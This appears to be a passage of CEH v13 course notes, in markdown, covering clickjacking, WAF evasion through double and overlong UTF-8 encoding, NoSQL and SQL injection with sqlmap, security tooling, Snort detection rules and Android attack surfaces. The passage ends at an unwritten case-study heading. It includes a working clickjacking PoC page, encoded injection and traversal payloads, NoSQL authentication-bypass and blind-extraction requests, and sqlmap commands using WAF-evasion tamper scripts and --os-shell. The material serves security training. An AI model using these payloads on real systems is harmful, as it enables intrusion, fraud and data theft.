# 🛡️ CEH v13 Master Lecture Notes: Advanced Domains & Specialized Attack Vectors

> **Course:** Certified Ethical Hacker (CEH v13) / Threat Hunting & SOC Engineering  
> **Session:** Master Class — Modules 15 through 20 & Advanced Specialized Vectors  
> **Date:** 2026-10-31  
> **Navigation:** [🏠 CEH Dashboard](./README.md) | [⬅️ Modules 04–14 Master Class](./2026-10-27-ceh-master-class-notes.md) | [Main Dashboard](../README.md)  
> **Associated Courseware:** CEH v13 Modules 15–20 PDFs & [Web Application Attacks Matrix](../References/CEH_REF/web_attacks.jpeg)

---

## 🧭 Executive Navigation Map

1. [The Unified Advanced Threat Continuum & Master Architectural Flow](#1-the-unified-advanced-threat-continuum--master-architectural-flow)
2. [Client-Side Attacks & Strategic Web Compromise](#2-client-side-attacks--strategic-web-compromise)
   - [Clickjacking (UI Redressing) Deep Mechanics](#clickjacking-ui-redressing-deep-mechanics)
   - [Framebusting Scripts & HTML5 Sandbox Bypasses](#framebusting-scripts--html5-sandbox-bypasses)
   - [Modern Framing Defenses (`X-Frame-Options` & CSP `frame-ancestors`)](#modern-framing-defenses-x-frame-options--csp-frame-ancestors)
   - [Watering Hole Attacks (Strategic Web Compromise)](#watering-hole-attacks-strategic-web-compromise)
3. [Data-Tier Exploitation & Character Encoding Mechanics](#3-data-tier-exploitation--character-encoding-mechanics)
   - [Character Encoding Pipelines: ASCII vs Hex vs URL Encoding](#character-encoding-pipelines-ascii-vs-hex-vs-url-encoding)
   - [WAF Impedance Mismatch & Evasion: Double Encoding & Overlong UTF-8](#waf-impedance-mismatch--evasion-double-encoding--overlong-utf-8)
   - [NoSQL Injection Mechanics (MongoDB, BSON & Operator Injection)](#nosql-injection-mechanics-mongodb-bson--operator-injection)
   - [NoSQLMap Tool Architecture & Automated Extraction Workflows](#nosqlmap-tool-architecture--automated-extraction-workflows)
   - [SQLMap Deep Dive: The 6 Detection Techniques (`BEUSTQ`) & Tamper Scripts](#sqlmap-deep-dive-the-6-detection-techniques-beustq--tamper-scripts)
4. [Security Tooling Ecosystem & Comparative Workflows](#4-security-tooling-ecosystem--comparative-workflows)
   - [Master Tool Comparison: ZAP vs Burp Suite vs Caido vs Snort vs SQLMap](#master-tool-comparison-zap-vs-burp-suite-vs-caido-vs-snort-vs-sqlmap)
   - [OWASP ZAP Headless DAST & CI/CD Pipeline Automation](#owasp-zap-headless-dast--cicd-pipeline-automation)
   - [PortSwigger Burp Suite: Intruder Modes & Collaborator OOB](#portswigger-burp-suite-intruder-modes--collaborator-oob)
   - [Caido: Next-Gen Rust Interception Architecture](#caido-next-gen-rust-interception-architecture)
   - [Snort NIDS/NIPS: Signature Grammar & Packet Preprocessing](#snort-nidsnips-signature-grammar--packet-preprocessing)
5. [Module 17: Mobile Platform Security & Malware Engineering](#5-module-17-mobile-platform-security--malware-engineering)
   - [OWASP Mobile Top 10 (M1 to M10) Comprehensive Taxonomy](#owasp-mobile-top-10-m1-to-m10-comprehensive-taxonomy)
   - [Android OS Security Architecture & Attack Surfaces](#android-os-security-architecture--attack-surfaces)
   - [Agent Smith Case Study: The Janus Vulnerability (CVE-2019-2107)](#agent-smith-case-study-the-janus-vulnerability-cve-2019-2107)
   - [Dynamic Instrumentation & Reversing: Frida, Objection & Jadx](#dynamic-instrumentation--reversing-frida-objection--jadx)
6. [Module 18: IoT & Operational Technology (OT / SCADA / PLC) Security](#6-module-18-iot--operational-technology-ot--scada--plc-security)
   - [IoT 4-Tier Architecture & Attack Vectors](#iot-4-tier-architecture--attack-vectors)
   - [Hardware Reversing: UART Identification & JTAG Boundary Scanning](#hardware-reversing-uart-identification--jtag-boundary-scanning)
   - [Firmware Extraction & Analysis with Binwalk](#firmware-extraction--analysis-with-binwalk)
   - [OT / SCADA / ICS Architecture: The Purdue Model (Levels 0–5)](#ot--scada--ics-architecture-the-purdue-model-levels-05)
   - [Industrial Protocols: Modbus TCP (Port 502) Vulnerabilities](#industrial-protocols-modbus-tcp-port-502-vulnerabilities)
   - [Defensive Architectures: Fortinet OT Security Fabric vs Microsoft Defender for IoT](#defensive-architectures-fortinet-ot-security-fabric-vs-microsoft-defender-for-iot)
7. [Module 19: Cloud Computing, Containers & Identity Graph Exploitation](#7-module-19-cloud-computing-containers--identity-graph-exploitation)
   - [Cloud Service Models (IaaS, PaaS, SaaS) & The Shared Responsibility Matrix](#cloud-service-models-iaas-paas-saas--the-shared-responsibility-matrix)
   - [Cloud Cryptography: Transit, Rest (Envelope KMS), and Confidential Computing (In-Use)](#cloud-cryptography-transit-rest-envelope-kms-and-confidential-computing-in-use)
   - [Container Security: Namespaces, cgroups, Docker Socket Abuse & Escapes](#container-security-namespaces-cgroups-docker-socket-abuse--escapes)
   - [Container Hardening: Seccomp, AppArmor, Capabilities & Falco Detection](#container-hardening-seccomp-apparmor-capabilities--falco-detection)
   - [Microsoft Graph & Azure AD (Entra ID) Architecture & Abuse](#microsoft-graph--azure-ad-entra-id-architecture--abuse)
8. [Endpoint Detection & Stealth Backdoor Processes (Endgame EDR)](#8-endpoint-detection--stealth-backdoor-processes-endgame-edr)
   - [Elastic Endgame EDR (Elastic Defend) Sensor Architecture](#elastic-endgame-edr-elastic-defend-sensor-architecture)
   - [Process Hollowing & Injection Tradecraft](#process-hollowing--injection-tradecraft)
   - [Backdoor Persistence: Services, Run Keys, and WMI Subscriptions](#backdoor-persistence-services-run-keys-and-wmi-subscriptions)
   - [Hunting In-Memory Backdoors & Unbacked Executable Memory](#hunting-in-memory-backdoors--unbacked-executable-memory)
9. [Module 20: Cryptanalysis & Post-Quantum Cryptography](#9-module-20-cryptanalysis--post-quantum-cryptography)
   - [Cryptanalysis Attack Models: COA, KPA, CPA, CCA, and Side-Channel Attacks](#cryptanalysis-attack-models-coa-kpa-cpa-cca-and-side-channel-attacks)
   - [The Quantum Threat: Shor's and Grover's Algorithms](#the-quantum-threat-shors-and-grovers-algorithms)
   - [NIST Post-Quantum Cryptography (PQC) Standards: ML-KEM, ML-DSA, SLH-DSA](#nist-post-quantum-cryptography-pqc-standards-ml-kem-ml-dsa-slh-dsa)
10. [Real-Time Technical Scenarios: Multi-Domain Attack & SOC Defense](#10-real-time-technical-scenarios-multi-domain-attack--soc-defense)
11. [Engineering Troubleshooting & Failed Attempts](#11-engineering-troubleshooting--failed-attempts)
12. [My Understanding Check](#12-my-understanding-check)

---

## 1. The Unified Advanced Threat Continuum & Master Architectural Flow

Modern enterprise compromises rarely happen in isolated silos. Advanced adversaries connect client-side web manipulation, application parsing discrepancies, cloud identity permissions, container isolation escapes, and physical/OT bridge crossings.

```text
+----------------------------------------------------------------------------------------------------+
|                             THE ADVANCED UNIFIED ATTACK CONTINUUM                                  |
+----------------------------------------------------------------------------------------------------+

  [LAYER 1: PERIMETER & CLIENT]      [LAYER 2: DATA & PARSER TIER]      [LAYER 3: CLOUD & IDENTITY]
  +-------------------------+        +--------------------------+        +--------------------------+
  |  • Clickjacking (UI)    | =====> |  • WAF Impedance Mismatch| =====> |  • Azure Entra ID Graph  |
  |  • Watering Hole Attack |        |  • Double URL / UTF-8    |        |  • OAuth Consent Phish   |
  |  • Mobile Rogue Vector  |        |  • SQLMap / NoSQLMap     |        |  • PRT Token Extraction  |
  +-------------------------+        +--------------------------+        +--------------------------+
               │                                                                      │
               ▼                                                                      ▼
  [LAYER 4: HOST & CONTAINER]        [LAYER 5: INDUSTRIAL & OT]         [LAYER 6: CRYPTANALYSIS]
  +-------------------------+        +--------------------------+        +--------------------------+
  |  • /var/run/docker.sock | =====> |  • Purdue Model L0-L2    | =====> |  • Chosen-Ciphertext     |
  |  • Process Hollowing    |        |  • Modbus Function Codes |        |  • Key Recovery Attacks  |
  |  • EDR / Endgame Bypass |        |  • PLC Logic Poisoning   |        |  • Post-Quantum Migration|
  +-------------------------+        +--------------------------+        +--------------------------+
```

---

## 2. Client-Side Attacks & Strategic Web Compromise

### Clickjacking (UI Redressing) Deep Mechanics
**Clickjacking** (also known as a **User Interface (UI) Redressing Attack**) is a client-side vulnerability where an attacker tricks a victim into clicking on an actionable element (e.g., "Confirm Wire Transfer", "Grant OAuth Access", "Delete Account") on a sensitive site while the victim believes they are interacting with an innocent underlying or overlying webpage (e.g., "Claim Free Gift" or "Play Game").

```text
+-----------------------------------------------------------------------------------+
|                        CLICKJACKING (UI REDRESSING) ANATOMY                       |
+-----------------------------------------------------------------------------------+

 Victim Browser View (Screen):
  ┌─────────────────────────────────────────────────────────┐
  │  🎉 CONGRATULATIONS! YOU WON A PRIZE!                   │
  │                                                         │
  │              ┌──────────────────────────┐               │
  │              │    [ CLICK TO CLAIM ]    │  <-- Visible Decoy Button
  │              └────────────┬─────────────┘      (Attacker Site)
  └───────────────────────────┼─────────────────────────────┘
                              │
 Actual Target Action Underneath (Invisible Iframe):
  ┌───────────────────────────┼─────────────────────────────┐
  │  BANKING PORTAL (Authenticated Session)                 │
  │                           │                             │
  │              ┌────────────▼─────────────┐               │
  │              │ [ CONFIRM $10,000 SEND ] │  <-- Hidden Sensitive Button
  │              └──────────────────────────┘      (Opacity: 0.0001, z-index: 999)
  └─────────────────────────────────────────────────────────┘
```

#### Why Clickjacking Works
1. **Cookie Ambient Authority:** The victim’s web browser automatically attaches authenticated session cookies (`Cookie: session_id=...`) to requests made inside an `<iframe>` unless strictly prohibited by cookie attributes (`SameSite=Strict`).
2. **CSS Stacking & Transparency:** By setting `opacity: 0.0001` (or `0`) and a higher `z-index`, the target sensitive application is loaded directly over the attacker's decorative graphics. The victim thinks they are clicking the button on the attacker's page, but the browser registers the mouse event on the topmost element—the invisible target iframe.

#### Technical Exploit PoC
```html
<!DOCTYPE html>
<html>
<head>
  <title>Win a Free iPad!</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      overflow: hidden;
    }
    /* Decoy Content displayed to the victim */
    .decoy-layer {
      position: absolute;
      top: 50px;
      left: 100px;
      z-index: 1;
    }
    .decoy-btn {
      width: 220px;
      height: 45px;
      background-color: #28a745;
      color: #fff;
      font-size: 18px;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }
    /* The vulnerable banking portal loaded in an invisible frame directly on top */
    .target-iframe {
      position: absolute;
      top: 20px;
      left: 70px;
      width: 600px;
      height: 400px;
      opacity: 0.0001; /* Invisible to the victim */
      z-index: 2;      /* Sits directly above the decoy button */
      filter: alpha(opacity=0);
    }
  </style>
</head>
<body>
  <div class="decoy-layer">
    <h1>Click Below to Claim Your Free Gift Card!</h1>
    <button class="decoy-btn">CLAIM NOW</button>
  </div>
  <!-- Victim is already authenticated to this endpoint -->
  <iframe class="target-iframe" src="https://bank.corp.internal/transfer?recipient=attacker&amount=10000"></iframe>
</body>
</html>
```

---

### Framebusting Scripts & HTML5 Sandbox Bypasses
Before standardized HTTP response headers were widely adopted, developers attempted to block framing using client-side JavaScript known as **Framebusting Scripts**:

```javascript
/* Classic Framebusting Script */
if (top != self) {
    top.location = self.location;
}
```

#### Why JavaScript Framebusting Is Fundamentally Flawed
Attackers can defeat client-side framebusting using multiple standard browser features:

1. **HTML5 Iframe `sandbox` Attribute:**  
   The attacker loads the target inside a sandboxed iframe without allowing top-level navigation:
   ```html
   <!-- Disallowing allow-top-navigation freezes top.location modifications -->
   <iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>
   ```
   When the target's JavaScript executes `top.location = self.location`, the browser throws a DOM security violation error and blocks the redirect, yet allows forms and button clicks to execute!

2. **The `window.onbeforeunload` Hijack:**  
   The attacker wraps the iframe loading inside an unloading handler that cancels or prompts confirmation when the page attempts to navigate away, trapping the user inside the framed context.

---

### Modern Framing Defenses (`X-Frame-Options` & CSP `frame-ancestors`)
Defense against clickjacking must be enforced at the HTTP response header layer by the server hosting the sensitive resource:

| Defensive Mechanism | Header Syntax | Behavioral Scope & Limitations |
| :--- | :--- | :--- |
| **X-Frame-Options: DENY** | `X-Frame-Options: DENY` | Completely blocks any domain (including the site itself) from framing this resource. **Recommended for APIs and administrative portals.** |
| **X-Frame-Options: SAMEORIGIN** | `X-Frame-Options: SAMEORIGIN` | Allows framing only if the parent frame originates from the exact same Origin (protocol, domain, port). |
| **CSP: `frame-ancestors 'none'`** | `Content-Security-Policy: frame-ancestors 'none';` | Modern W3C standard; supersedes `X-Frame-Options`. Blocks all framing attempts globally. |
| **CSP: `frame-ancestors 'self' <domains>`** | `Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;` | Granularly permits whitelisted third-party parent origins to embed the page. |
| **SameSite Cookie Attribute** | `Set-Cookie: session=xyz; SameSite=Strict; Secure` | Mitigates ambient cookie attachment during cross-site iframe requests. |

---

### Watering Hole Attacks (Strategic Web Compromise)
A **Watering Hole Attack** (formally categorized as a **Strategic Web Compromise**) is an advanced social engineering and exploitation tradecraft where adversaries profile a target organization or community, identify trusted third-party websites they regularly visit (the "watering hole"), compromise that external website, and inject malicious code designed to infect visitors belonging strictly to the target organization.

```text
+----------------------------------------------------------------------------------------------------+
|                                    WATERING HOLE ATTACK PIPELINE                                   |
+----------------------------------------------------------------------------------------------------+

  [STEP 1: RECONNAISSANCE]        [STEP 2: STRATEGIC COMPROMISE]       [STEP 3: TARGET PROFILING & FILTER]
  Adversary monitors target       Adversary discovers SQLi/RCE         Malicious script executes in visitor
  engineers/executives.           on regional industry portal          browser. Inspects source IP/User-Agent.
  Identifies daily visit to:      (e.g., 'scada-engineers.org').                 │
  'scada-engineers.org'           Injects invisible profiler JS.                 │
                                                                                 ▼
  [STEP 5: ENTERPRISE PIVOT]      [STEP 4: ZERO-DAY EXPLOITATION]      Is visitor from Target IP Subnet?
  Attacker establishes C2         Browser exploit triggers silently.   ├── NO  ──> Render normal website.
  beacon inside corporate SOC/    Drops stealth backdoor in RAM        └── YES ──> Deliver zero-day browser
  OT network. Lateral movement.   (Reflective DLL / Shellcode).                    exploit payload!
```

#### Why Watering Hole Attacks Succeed
- **Bypasses Traditional Perimeter Firewalls:** The target user initiates an outbound HTTP/HTTPS connection to a trusted, highly categorized website (e.g., "Engineering / Industrial News"), which firewall egress filters allow.
- **Micro-Targeted IP Filtering:** Attackers program the injected script to check the visitor's public IP block against ARIN/RIPE WHOIS records. If the visitor is not from the target defense contractor or energy corporation, the exploit does not trigger, evading detection by automated threat intelligence crawlers and security researchers.

---

## 3. Data-Tier Exploitation & Character Encoding Mechanics

### Character Encoding Pipelines: ASCII vs Hex vs URL Encoding
Web application firewalls (WAFs) and backends interpret character streams differently depending on their internal decoding pipelines. Understanding the transition between character representations is foundational to vulnerability identification and filter evasion.

```text
+-----------------------------------------------------------------------------------+
|                        CHARACTER ENCODING CONVERSION CHAIN                        |
+-----------------------------------------------------------------------------------+

 Character:        '              <               SPACE             /
 Decimal ASCII:    39             60              32                47
 Hexadecimal Byte: 0x27           0x3C            0x20              0x2F
 URL (Percent):    %27            %3C             %20 (or +)        %2F
 Double URL:       %2527          %253C           %2520             %252F
 HTML Entity:      &#39; / &apos; &#60; / &lt;    &#32;             &#47;
 Unicode Overlong: %C0%A7         %C0%BC          %C0%A0            %C0%AF
```

---

### WAF Impedance Mismatch & Evasion: Double Encoding & Overlong UTF-8
An **Impedance Mismatch** occurs when a security inspection device (WAF, IDS/IPS, Reverse Proxy) decodes an incoming HTTP payload using one parser or standard, passes the inspected data forward, and the backend application server (Node.js, Tomcat, IIS, Nginx) or database performs a *second* decoding pass.

```text
+----------------------------------------------------------------------------------------------------+
|                                 DOUBLE URL ENCODING WAF BYPASS                                     |
+----------------------------------------------------------------------------------------------------+

 Attacker Injects:        WAF Inspection Phase:              Backend Web Application:
 ------------------       ---------------------              ------------------------
 http://target/search?    WAF Decodes ONCE:                  Application Decodes SECOND TIME:
 id=1%2527%20OR%201=1    • "%25" becomes "%"                • "%27" becomes "'"
                          • Result: "1%27 OR 1=1"            • Result: "1' OR 1=1"
                          • WAF Rule Check: Does NOT         • Query executes as raw SQL Injection!
                            detect raw single quote "'"      • Authentication Bypassed!
                          • Verdict: ALLOW PASS-THROUGH
```

#### Overlong UTF-8 Encoding
In RFC-compliant UTF-8, characters in the standard ASCII range (0–127) must be encoded in a single byte. However, non-compliant decoders may allow characters to be encoded across two or more bytes (Overlong Encoding). For example:
- Standard ASCII Forward Slash `/` = `0x2F` (`%2F`)
- 2-byte Overlong UTF-8 Slash `/` = `11000000 10101111` = `0xC0 0xAF` (`%C0%AF`)

A WAF inspecting for directory traversal blocks `../`, but may fail to match `%C0%AE%C0%AE%C0%AF`, which a buggy IIS or Apache server decodes directly to `../`.

---

### NoSQL Injection Mechanics (MongoDB, BSON & Operator Injection)
Unlike traditional relational databases that use Structured Query Language (SQL) with strict schemas and tables, **NoSQL databases** (MongoDB, CouchDB, Amazon DynamoDB) store unstructured data as JSON or binary JSON (**BSON**) documents.

#### Why NoSQL Injection Works
When web application backends (commonly built on Node.js/Express, Python/Flask) ingest user input directly into query filters without type validation or sanitization, attackers can inject **BSON Query Operators** (`$ne`, `$gt`, `$regex`, `$where`) instead of literal string values.

```text
Traditional Relational SQL Query:
SELECT * FROM users WHERE username = 'admin' AND password = 'secretPassword';

MongoDB Document Query (Node.js / Mongoose):
db.users.find({ username: req.body.username, password: req.body.password });
```

#### Authentication Bypass via Operator Injection
If an application parses JSON input from an HTTP POST request:

```http
POST /api/v1/login HTTP/1.1
Host: corp-portal.com
Content-Type: application/json

{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

The database executes:
```javascript
db.users.find({ username: { $ne: null }, password: { $ne: null } })
```
Since every existing record in the database has a username and password that are **Not Equal (`$ne`) to null**, the query returns `true` for the first record found—typically the administrative account (`admin`)—granting an immediate authentication bypass!

---

### NoSQLMap Tool Architecture & Automated Extraction Workflows
**NoSQLMap** is an automated open-source penetration testing tool designed to audit, detect, and exploit NoSQL database vulnerabilities, default configurations, and injection flaws (specifically targeting MongoDB and CouchDB).

```text
+-----------------------------------------------------------------------------------+
|                            NOSQLMAP INTERNAL ARCHITECTURE                         |
+-----------------------------------------------------------------------------------+

                          +-----------------------+
                          |   Target Application   |
                          +-----------┬-----------+
                                      │
                   [HTTP POST / GET / REST API Ingestion]
                                      │
                                      ▼
  +-----------------------------------------------------------------------+
  |                           NoSQLMap Engine                             |
  |  ┌───────────────────┐ ┌───────────────────┐ ┌─────────────────────┐  |
  |  │ Default Port &    │ │ Parameter Fuzzing │ │ Blind Timing &      │  |
  |  │ Unauth DB Scanner │ │ (BSON Operators)  │ │ Regex Data Extractor│  |
  |  └───────────────────┘ └───────────────────┘ └─────────────────────┘  |
  +-----------------------------------------------------------------------+
                                      │
                       [Blind Character Extraction]
                                      │
                                      ▼
                        Extracted Password: "SuperSecret2026!"
```

#### Operational NoSQLMap Workflows
```bash
# Launch interactive NoSQLMap terminal
nosqlmap

# Automated exploitation against an application parameter
# 1. Select 'Set options'
# 2. Specify target URL: http://10.10.10.60/login.php
# 3. Specify HTTP method: POST
# 4. Specify POST data: user=admin&pass=test
# 5. Execute Load Attacks -> NoSQL Injection Tests
```

#### Blind Data Extraction via `$regex`
When the backend application suppresses database output, attackers perform character-by-character blind extraction using regular expressions:
```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": "admin", "password": {"$regex": "^b.*"}}
...
{"username": "admin", "password": {"$regex": "^S.*"}}  <-- Returns HTTP 200 (Character confirmed: 'S')
{"username": "admin", "password": {"$regex": "^Su.*"}} <-- Returns HTTP 200 (Character confirmed: 'u')
```

---

### SQLMap Deep Dive: The 6 Detection Techniques (`BEUSTQ`) & Tamper Scripts
**SQLMap** is the industry-standard automated SQL injection exploitation engine. It implements six formal injection techniques designated by the acronym **BEUSTQ**:

| Code | Injection Technique | Operating Mechanics & Network Behavior |
| :---: | :--- | :--- |
| **B** | **Boolean-based Blind** | Injects SQL conditional queries (`AND 1=1` vs `AND 1=2`) and observes differences in HTTP response status codes, body lengths, or HTML keywords to deduce data bit-by-bit. |
| **E** | **Error-based** | Forces the database management system (DBMS) to execute functions that trigger runtime errors containing query results within the error text (e.g., `EXTRACTVALUE()`, `CONVERT()`). |
| **U** | **Union query-based** | Appends `UNION ALL SELECT null, null, @@version--` to merge the results of an attacker query directly into the application's legitimate HTTP response table. |
| **S** | **Stacked queries** | Injects a query termination delimiter (`;`) followed by a completely new SQL statement (e.g., `; DROP TABLE audit;`). Requires DBMS driver support (common in MSSQL and PostgreSQL; rare in MySQL PHP drivers). |
| **T** | **Time-based Blind** | Injects heavy sleep statements (`WAITFOR DELAY '0:0:5'`, `pg_sleep(5)`, `sleep(5)`) and measures HTTP response latency to infer character accuracy. |
| **Q** | **Inline Queries (Out-of-Band - OOB)** | Forces the database to make external DNS or SMB lookups (`xp_dirtree` in MSSQL, `UTL_INADDR` in Oracle) resolving database strings into external DNS log queries. |

#### High-Yield SQLMap Commands & Tamper Script Workflows
```bash
# Comprehensive automated scan targeting POST request captured in burp_req.txt
sqlmap -r burp_req.txt --batch --dbs --level=5 --risk=3

# Specific technique isolation (Union + Time-based) with random user-agent
sqlmap -u "https://target.corp/item?id=10" --technique=UT --random-agent --current-user

# Bypassing Web Application Firewalls using chained tamper scripts
sqlmap -u "https://target.corp/search?q=test" \
  --tamper=space2comment,between,randomcase,charencode \
  --threads=4 \
  --dbms=MySQL \
  --os-shell
```

---

## 4. Security Tooling Ecosystem & Comparative Workflows

### Master Tool Comparison: ZAP vs Burp Suite vs Caido vs Snort vs SQLMap

| Tool | Primary Category | Engine / Core Language | Architectural Model | Primary Use-Case | SOC vs Red Team Utility |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **OWASP ZAP** | Dynamic App Security Testing (DAST) | Java | Monolithic Desktop / Headless Daemon | Automated web application vulnerability scanning; CI/CD pipeline security gates. | **Dual:** AppSec engineers for automated regression tests; SOC for DAST validation. |
| **PortSwigger Burp Suite** | Web Application Proxy & Pentest Suite | Java | Monolithic Client with Native Browser | Manual offensive security auditing, deep HTTP session manipulation, custom extensions. | **Offensive:** De-facto industry standard for Red Teams and web application penetration testers. |
| **Caido** | Web Interception Proxy | Rust (Core) + TypeScript (UI) | Decoupled Client-Server (Lightweight Daemon + Web UI) | High-speed, low-memory HTTP manipulation; remote VPS headless interception. | **Offensive:** Modern lightweight alternative to Burp Suite for resource-constrained environments. |
| **Snort** | Network IDS / IPS | C / C++ | Packet Capture Engine (Libpcap / DAQ) | Real-time network intrusion detection, protocol anomaly inspection, inline packet dropping. | **Defensive:** SOC Analysts and Network Security Engineers for perimeter intrusion monitoring. |
| **SQLMap** | Automated Database Exploitation | Python | Command-Line CLI Pipeline | Automated discovery, fingerprinting, and exploitation of SQL injection vulnerabilities. | **Offensive:** Vulnerability assessment, Red Team lateral movement, database exfiltration. |

---

### OWASP ZAP Headless DAST & CI/CD Pipeline Automation
**OWASP Zed Attack Proxy (ZAP)** is widely utilized in DevSecOps pipelines due to its mature command-line interface, REST API, and native Docker containers.

```bash
# Execute headless baseline scan against target inside a CI/CD runner
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t https://staging.internal.corp \
  -r zap_report.html \
  -I

# Automated full penetration scan against OpenAPI / Swagger definition
zap-full-scan.py -t https://api.internal.corp/v1/swagger.json -g api_gen.conf -r api_audit.html
```

---

### PortSwigger Burp Suite: Intruder Modes & Collaborator OOB
**Burp Suite Intruder** facilitates automated, customizable payload injection across designated positions (`§marker§`):

```text
+-----------------------------------------------------------------------------------+
|                           BURP SUITE INTRUDER ATTACK MODES                        |
+-----------------------------------------------------------------------------------+

 1. Sniper:
    • Single payload list.
    • Tests one position at a time sequentially.
    • Position A, then Position B. Best for fuzzing parameters for reflection.

 2. Battering Ram:
    • Single payload list.
    • Injects the IDENTICAL payload across ALL marked positions simultaneously.
    • Useful when username and password might match (e.g., admin:admin).

 3. Pitchfork:
    • Multiple payload lists (one per marked position).
    • Steps through lists in parallel (row-by-row matching: List1[0] with List2[0]).
    • Useful for credential stuffing with known paired lists (user:pass).

 4. Cluster Bomb:
    • Multiple payload lists.
    • Exhaustive Cartesian product (tests every combination of List1 against List2).
    • Highest request volume. Essential for brute-forcing username + password matrices.
+-----------------------------------------------------------------------------------+
```

#### Burp Collaborator Mechanics (Out-of-Band Testing)
When assessing blind vulnerabilities (Blind SSRF, Blind XXE, Blind SQL Injection, Blind OS Command Injection), the application may never echo output back to the browser.
1. The tester inserts a unique subdomain generated by Burp Collaborator: `http://3k9z8x.oastify.com`.
2. The target server makes an internal backend DNS resolution or HTTP GET request to `3k9z8x.oastify.com`.
3. The Collaborator server logs the originating IP, timestamp, and query details.
4. Burp Suite polls Collaborator over an encrypted channel, alerting the tester to the confirmed out-of-band vulnerability.

---

### Caido: Next-Gen Rust Interception Architecture
**Caido** is built from the ground up in **Rust** to resolve memory overhead issues commonly encountered when running Java-based proxies (like Burp Suite) on constrained instances.

```text
+-----------------------------------------------------------------------------------+
|                            CAIDO SYSTEM ARCHITECTURE                              |
+-----------------------------------------------------------------------------------+

   Remote VPS / Headless Server                        Auditor Laptop / Workstation
  ┌──────────────────────────────┐                   ┌──────────────────────────────┐
  │         Caido Daemon         │  Encrypted TLS    │         Caido UI Client      │
  │     (Written in Rust)        │  WebSocket /      │    (Desktop App / Browser)   │
  │                              │  GraphQL API      │                              │
  │ • Fast HTTP/1.1 & HTTP/2     │ <===============> │ • Full Traffic Replay        │
  │ • Low RAM footprint (~50MB)  │                   │ • Modern Hex / JSON Viewer   │
  │ • SQLite Session DB Engine   │                   │ • Scoped Search & Tamper     │
  └──────────────────────────────┘                   └──────────────────────────────┘
```

---

### Snort NIDS/NIPS: Signature Grammar & Packet Preprocessing
**Snort** operates across three modes: Sniffer mode, Packet Logger mode, and Network Intrusion Detection/Prevention System (NIDS/NIPS) mode.

```text
+-----------------------------------------------------------------------------------+
|                               SNORT RULE STRUCTURE                                |
+-----------------------------------------------------------------------------------+
 [Rule Header]                                 [Rule Options]
 ┌──────┬──────┬──────────────┬──────┬────┬──────────┬────┐ ┌─────────────────────────┐
 │action│proto │  src_ip      │src_pt│dir │  dst_ip  │dst_│ │ msg; sid; rev; content;  │
 ├──────┼──────┼──────────────┼──────┼────┼──────────┼────┤ ├─────────────────────────┤
 │alert │ tcp  │ $EXTERNAL_NET│ any  │ -> │ $HTTP_SER│ 80 │ │ msg:"SQLi Attempt";...  │
 └──────┴──────┴──────────────┴──────┴────┴──────────┴────┘ └─────────────────────────┘
```

#### Production Snort Rule Examples
```snort
# Detect SQL Injection 'OR 1=1' in HTTP Traffic
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"ATTACK-RESPONSES SQL Injection Attempt - OR 1=1 Detected";
    flow:to_server,established;
    content:"%27",nocase;
    content:"OR",distance:1,nocase;
    pcre:"/(%27|\')\s*(or|OR)\s*.*=.*--/i";
    classtype:web-application-attack;
    sid:1000045;
    rev:1;
)

# Detect Modbus TCP Unauthorized Coil Write (Port 502)
alert tcp $EXTERNAL_NET any -> $SCADA_SERVERS 502 (
    msg:"SCADA_ALERT Modbus TCP Function Code 05 (Write Single Coil) Detected";
    flow:to_server,established;
    content:"|00 00|",depth 2; # Transaction ID
    content:"|00 00|",distance 2,depth 2; # Protocol ID (Modbus = 0)
    byte_test:1,=,0x05,7; # Function Code 05 at offset 7
    classtype:protocol-command-decode;
    sid:2000012;
    rev:1;
)
```

---

## 5. Module 17: Mobile Platform Security & Malware Engineering

### OWASP Mobile Top 10 (M1 to M10) Comprehensive Taxonomy

```text
+-----------------------------------------------------------------------------------+
|                             OWASP MOBILE TOP 10 (2024)                            |
+-----------------------------------------------------------------------------------+
 M1: Improper Credential Usage           Hardcoded API keys, tokens baked in APK DEX
 M2: Inadequate Supply Chain Security    Compromised third-party SDKs, poisoned repos
 M3: Insecure Authentication/Auth        Local client-side biometrics without server validation
 M4: Insufficient Input/Output Validation SQLi, Path Traversal, Intent Spoofing, IPC injection
 M5: Insecure Communication              Missing TLS/SSL Pinning, cleartext HTTP, expired certs
 M6: Inadequate Privacy Controls         Personally Identifiable Information (PII) leak in logs
 M7: Insufficient Binary Protections     Lack of root/jailbreak detection, missing code obfuscation
 M8: Security Misconfiguration           Exported activities/broadcast receivers in Manifest
 M9: Insecure Data Storage               Unencrypted SQLite DBs, world-readable SharedPreferences
 M10: Insufficient Cryptography          Hardcoded DES/AES-ECB keys, broken PRNG seeds
+-----------------------------------------------------------------------------------+
```

---

### Android OS Security Architecture & Attack Surfaces
Android is built on a modified Linux kernel utilizing **Application Sandboxing**: each Android application is assigned a unique Linux User ID (**UID**). Application processes cannot read or write another application’s memory or files unless explicitly granted permissions via Inter-Process Communication (**IPC**) mechanisms.

```text
+-----------------------------------------------------------------------------------+
|                        ANDROID ATTACK SURFACE MAP (APK ANATOMY)                   |
+-----------------------------------------------------------------------------------+

 APK Package (ZIP Format):
  ├── AndroidManifest.xml  ===> Attack Surface: Exported Activities, Receivers, Intents
  ├── classes.dex          ===> Attack Surface: Dalvik Bytecode, Hardcoded Keys, Logic Flaws
  ├── res/ / resources.arsc===> Attack Surface: Raw strings, sensitive endpoints
  └── lib/ (Native .so)    ===> Attack Surface: Memory corruption, buffer overflows in C/C++
```

#### The `AndroidManifest.xml` Misconfiguration Risk
If an application component defines `android:exported="true"`, any other malicious app on the phone can trigger it directly without needing permissions:
```xml
<!-- Vulnerable: Exported Activity Accessible to Any App -->
<activity android:name=".ui.AdminConsoleActivity" android:exported="true" />
```
An attacker launches this activity directly using Android Debug Bridge (`adb`):
```bash
adb shell am start -n com.victim.banking/.ui.AdminConsoleActivity
```

---

### Agent Smith Case Study: The Janus Vulnerability (CVE-2019-2107)
